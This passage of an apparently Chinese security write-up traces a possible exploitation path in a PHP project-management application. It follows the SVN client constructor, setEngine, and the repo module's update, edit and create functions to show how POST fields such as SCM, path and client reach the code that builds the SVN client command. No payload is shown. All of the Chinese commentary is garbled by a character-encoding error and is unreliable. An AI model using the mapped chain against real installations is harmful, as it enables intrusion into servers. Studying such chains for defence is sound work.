</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>remote</span>   <span class=o>=</span> <span class=o>!</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>root</span><span class=p>,</span> <span class=s1>&#39;file&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>client</span>   <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>remote</span> <span class=o>?</span> <span class=nv>$client</span> <span class=o>.</span> <span class=s2>&#34; --username @account@ --password @password@&#34;</span> <span class=o>:</span> <span class=nv>$client</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>encoding</span> <span class=o>==</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>encoding</span> <span class=o>=</span> <span class=s1>&#39;gbk&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>svnVersion</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>getSVNVersion</span><span class=p>(</span><span class=nv>$client</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å› æ­¤å°±éœ€è¦æ‰¾åˆ°è°ƒç”¨æ„é€ æ–¹æ³•çš„åœ°æ–¹</p><h3 id=222-setengine>2.2.2 setEngine</h3><p>æ ¹æ®è¯¥æ„é€ å‡½æ•°çš„å‚æ•°ç‰¹ç‚¹ï¼Œæ‰¾åˆ°ä½äº<code>lib/scm/scm.class.php</code>â€‹çš„<code>setEngine</code>å‡½æ•°è°ƒç”¨äº†è¯¥æ„é€ æ–¹æ³•</p><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217015818.png loading=lazy alt=image></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>setEngine</span><span class=p>(</span><span class=nv>$repo</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$className</span> <span class=o>=</span> <span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>SCM</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$className</span> <span class=o>==</span> <span class=s1>&#39;Git&#39;</span><span class=p>)</span> <span class=nv>$className</span> <span class=o>=</span> <span class=s1>&#39;GitRepo&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>class_exists</span><span class=p>(</span><span class=nv>$className</span><span class=p>))</span> <span class=k>require</span><span class=p>(</span><span class=nx>strtolower</span><span class=p>(</span><span class=nv>$className</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;.class.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>engine</span> <span class=o>=</span> <span class=k>new</span> <span class=nv>$className</span><span class=p>(</span><span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>client</span><span class=p>,</span> <span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>path</span><span class=p>,</span> <span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>account</span><span class=p>,</span> <span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>password</span><span class=p>,</span> <span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>encoding</span><span class=p>,</span> <span class=nv>$repo</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥æ‰¾æœ‰å“ªé‡Œè°ƒç”¨äº†<code>setEngine</code>å‡½æ•°ï¼Œç­›é€‰æ¡ä»¶æ˜¯å‡½æ•°é€»è¾‘ç›¸å¯¹ç®€å•ï¼Œå‡½æ•°ä¼ å‚å¥½å®ç°ã€‚</p><p>ä¸¾ä¸€ä¸ªåä¾‹ï¼Œè¿™ç§repoå‚æ•°ï¼Œå¾ˆéš¾åœ¨postè¯·æ±‚ä¸­ä¼ è¿‡å»</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getRepoTags</span><span class=p>(</span><span class=nv>$repo</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>client</span><span class=p>)</span> <span class=k>or</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>path</span><span class=p>)</span> <span class=k>or</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>account</span><span class=p>)</span> <span class=k>or</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>password</span><span class=p>)</span> <span class=k>or</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>encoding</span><span class=p>))</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$scm</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>app</span><span class=o>-&gt;</span><span class=na>loadClass</span><span class=p>(</span><span class=s1>&#39;scm&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$scm</span><span class=o>-&gt;</span><span class=na>setEngine</span><span class=p>(</span><span class=nv>$repo</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$scm</span><span class=o>-&gt;</span><span class=na>tags</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=223-updateä¸edit>2.2.3 updateä¸edit</h3><p>ä½äº<code>module/repo/model.php</code>â€‹çš„<code>update</code>å‡½æ•°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>update</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$repo</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>getRepoByID</span><span class=p>(</span><span class=nv>$id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkConnection</span><span class=p>())</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$isPipelineServer</span> <span class=o>=</span> <span class=nx>in_array</span><span class=p>(</span><span class=nx>strtolower</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span><span class=p>),</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>config</span><span class=o>-&gt;</span><span class=na>repo</span><span class=o>-&gt;</span><span class=na>gitServiceList</span><span class=p>)</span> <span class=o>?</span> <span class=k>true</span> <span class=o>:</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=nx>fixer</span><span class=o>::</span><span class=na>input</span><span class=p>(</span><span class=s1>&#39;post&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$isPipelineServer</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>serviceToken</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>,</span> <span class=s1>&#39;path&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>,</span> <span class=s1>&#39;client&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>,</span> <span class=s1>&#39;extra&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>serviceProject</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setDefault</span><span class=p>(</span><span class=s1>&#39;prefix&#39;</span><span class=p>,</span> <span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>,</span> <span class=s1>&#39;prefix&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setDefault</span><span class=p>(</span><span class=s1>&#39;client&#39;</span><span class=p>,</span> <span class=s1>&#39;svn&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setDefault</span><span class=p>(</span><span class=s1>&#39;product&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>skipSpecial</span><span class=p>(</span><span class=s1>&#39;path,client,account,password&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>join</span><span class=p>(</span><span class=s1>&#39;product&#39;</span><span class=p>,</span> <span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setDefault</span><span class=p>(</span><span class=s1>&#39;projects&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>join</span><span class=p>(</span><span class=s1>&#39;projects&#39;</span><span class=p>,</span> <span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>get</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>path</span> <span class=o>!=</span> <span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>path</span><span class=p>)</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>synced</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>acl</span> <span class=o>=</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>acl</span><span class=p>)</span> <span class=o>?</span> <span class=s1>&#39;&#39;</span> <span class=o>:</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>acl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Subversion&#39;</span> <span class=k>and</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>path</span> <span class=o>!=</span> <span class=nv>$repo</span><span class=o>-&gt;</span><span class=na>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$scm</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>app</span><span class=o>-&gt;</span><span class=na>loadClass</span><span class=p>(</span><span class=s1>&#39;scm&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>            <span class=nv>$scm</span><span class=o>-&gt;</span><span class=na>setEngine</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/*....ä¸å…³é”®ä»£ç ....*/</span>   
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>åªè¦postä¼ å‚<code>if($data->SCM == 'Subversion' and $data->path != $repo->path)</code>ä¸ºçœŸå³å¯</p><p>æ ¹æ®mvcæ¡†æ¶ï¼Œmodelå±‚çš„å‡½æ•°æ—¶è®¿é—®ä¸äº†çš„ï¼Œæ‰€ä»¥å¾—æ‰¾ä¸€ä¸ªcontrolå±‚çš„ï¼Œè°ƒç”¨updateçš„å‡½æ•°</p><p>ä½äº<code>module/repo/control.php</code>â€‹çš„å‡½æ•°<code>edit</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>edit</span><span class=p>(</span><span class=nv>$repoID</span><span class=p>,</span> <span class=nv>$objectID</span> <span class=o>=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>commonAction</span><span class=p>(</span><span class=nv>$repoID</span><span class=p>,</span> <span class=nv>$objectID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$repo</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>repo</span><span class=o>-&gt;</span><span class=na>getRepoByID</span><span class=p>(</span><span class=nv>$repoID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$noNeedSync</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>repo</span><span class=o>-&gt;</span><span class=na>update</span><span class=p>(</span><span class=nv>$repoID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/*....ä¸å…³é”®ä»£ç .....*/</span>
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=223-æ„é€ ä¸€ä¸ªrepo>2.2.3 æ„é€ ä¸€ä¸ªrepo</h3><p>ä¸ºäº†å®ç°ä¸Šè¿°åˆ©ç”¨é“¾ï¼Œè¿˜éœ€æ„é€ ä¸€ä¸ªrepoï¼Œä½¿<code>setEngine</code>å‡½æ•°æ‰§è¡Œæ—¶ï¼Œèƒ½æœ‰ä¸€ä¸ªrepoç”¨</p><p>ä½äº<code>module/repo/control.php</code>â€‹çš„å‡½æ•°<code>create</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>create</span><span class=p>(</span><span class=nv>$objectID</span> <span class=o>=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$repoID</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>repo</span><span class=o>-&gt;</span><span class=na>create</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     <span class=cm>/*............*/</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è°ƒç”¨ä½äº<code>module/repo/model.php</code>â€‹çš„å‡½æ•°<code>create</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>create</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkClient</span><span class=p>())</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkConnection</span><span class=p>())</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$isPipelineServer</span> <span class=o>=</span> <span class=nx>in_array</span><span class=p>(</span><span class=nx>strtolower</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span><span class=p>),</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>config</span><span class=o>-&gt;</span><span class=na>repo</span><span class=o>-&gt;</span><span class=na>gitServiceList</span><span class=p>)</span> <span class=o>?</span> <span class=k>true</span> <span class=o>:</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=nx>fixer</span><span class=o>::</span><span class=na>input</span><span class=p>(</span><span class=s1>&#39;post&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$isPipelineServer</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>serviceToken</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>,</span> <span class=s1>&#39;path&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>,</span> <span class=s1>&#39;client&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>,</span> <span class=s1>&#39;extra&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>serviceProject</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$isPipelineServer</span><span class=p>,</span> <span class=s1>&#39;prefix&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Git&#39;</span><span class=p>,</span> <span class=s1>&#39;account&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setIf</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Git&#39;</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>skipSpecial</span><span class=p>(</span><span class=s1>&#39;path,client,account,password&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setDefault</span><span class=p>(</span><span class=s1>&#39;product&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>join</span><span class=p>(</span><span class=s1>&#39;product&#39;</span><span class=p>,</span> <span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>setDefault</span><span class=p>(</span><span class=s1>&#39;projects&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>join</span><span class=p>(</span><span class=s1>&#39;projects&#39;</span><span class=p>,</span> <span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>get</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>acl</span> <span class=o>=</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>acl</span><span class=p>)</span> <span class=o>?</span> <span class=s1>&#39;&#39;</span> <span class=o>:</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>acl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Subversion&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$scm</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>app</span><span class=o>-&gt;</span><span class=na>loadClass</span><span class=p>(</span><span class=s1>&#39;scm&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$scm</span><span class=o>-&gt;</span><span class=na>setEngine</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$info</span>     <span class=o>=</span> <span class=nv>$scm</span><span class=o>-&gt;</span><span class=na>info</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$infoRoot</span> <span class=o>=</span> <span class=nx>urldecode</span><span class=p>(</span><span class=nv>$info</span><span class=o>-&gt;</span><span class=na>root</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>prefix</span> <span class=o>=</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$infoRoot</span><span class=p>)</span> <span class=o>?</span> <span class=s1>&#39;&#39;</span> <span class=o>:</span> <span class=nx>trim</span><span class=p>(</span><span class=nx>str_ireplace</span><span class=p>(</span><span class=nv>$infoRoot</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;\\&#39;</span><span class=p>,</span> <span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>path</span><span class=p>)),</span> <span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>prefix</span><span class=p>)</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>prefix</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>prefix</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
